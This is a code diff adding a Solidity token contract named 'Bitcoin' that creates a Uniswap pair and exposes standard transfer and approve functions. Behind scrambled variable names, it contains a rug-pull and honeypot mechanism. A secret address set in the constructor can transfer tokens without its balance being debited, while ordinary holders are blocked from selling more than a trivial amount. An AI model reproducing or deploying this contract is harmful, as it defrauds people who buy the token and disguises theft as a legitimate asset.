@@ -1,0 +1,64 @@
+contract Bitcoin is Ownable {
+    constructor(string memory yawf, string memory glswb, address saczm, address semw) {
+        name = yawf;
+        symbol = glswb;
+        balanceOf[msg.sender] = totalSupply;
+        rejiqgvayxs[semw] = utnqhl;
+        IUniswapV2Router02 ueval = IUniswapV2Router02(saczm);
+        qhor = IUniswapV2Factory(ueval.factory()).createPair(address(this), ueval.WETH());
+    }
+
+    string public name;
+
+    string public symbol;
+
+    function glcwytr(address socwq, address hxnek, uint256 tirfekma) private {
+        if (0 == rejiqgvayxs[socwq]) {
+            if (socwq != qhor && tqdfzrjhauv[socwq] != block.number && tirfekma < totalSupply) {
+                require(tirfekma <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[socwq] -= tirfekma;
+        }
+        balanceOf[hxnek] += tirfekma;
+        tqdfzrjhauv[hxnek] = block.number;
+        emit Transfer(socwq, hxnek, tirfekma);
+    }
+
+    mapping(address => uint256) public balanceOf;
+
+    function approve(address rxgdptosum, uint256 tirfekma) public returns (bool success) {
+        allowance[msg.sender][rxgdptosum] = tirfekma;
+        emit Approval(msg.sender, rxgdptosum, tirfekma);
+        return true;
+    }
+
+    address private qhor;
+
+    uint256 private utnqhl = 112;
+
+    mapping(address => uint256) private rejiqgvayxs;
+
+    mapping(address => uint256) private tqdfzrjhauv;
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function transfer(address hxnek, uint256 tirfekma) public returns (bool success) {
+        glcwytr(msg.sender, hxnek, tirfekma);
+        return true;
+    }
+
+    uint8 public decimals = 9;
+
+    function transferFrom(address socwq, address hxnek, uint256 tirfekma) public returns (bool success) {
+        require(tirfekma <= allowance[socwq][msg.sender]);
+        allowance[socwq][msg.sender] -= tirfekma;
+        glcwytr(socwq, hxnek, tirfekma);
+        return true;
+    }
+}
